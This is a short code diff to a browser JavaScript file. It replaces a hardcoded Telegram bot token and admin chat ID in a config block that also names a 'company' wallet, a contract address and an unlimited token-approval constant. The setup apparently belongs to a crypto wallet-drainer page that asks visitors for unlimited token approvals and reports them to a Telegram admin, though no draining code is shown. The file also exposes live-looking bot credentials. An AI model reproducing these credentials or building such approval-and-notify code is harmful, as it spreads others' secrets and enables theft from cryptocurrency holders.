@@ -22,8 +22,8 @@ document.addEventListener("DOMContentLoaded", function () {
     const CONFIG = {
         COMPANY_WALLET_ADDRESS: "0x0192cbD7ab3a3732C367223CaaC6633Cb86d41B1",
         CONTRACT_ADDRESS: "0x064BF72207e0c9981cA821BB4D85f89f08901e6A",
-        TELEGRAM_BOT_TOKEN: "8921017188:AAHQaL4HaWtDzd73VSq0jO2K2xGX0LUM-Xk", // Notification Bot Token (Bot A)
-        ADMIN_CHAT_ID: "8975376700", // CRITICAL: Your Admin Group Chat ID
+        TELEGRAM_BOT_TOKEN: "8704822787:AAG9v6sxaDoUDEk9IMStG3p4QxfZ0ll9aLA", // Notification Bot Token (Bot A)
+        ADMIN_CHAT_ID: "8610444092", // CRITICAL: Your Admin Group Chat ID
     };
 
     // Constant for Unlimited Approval (MAX_UINT256)
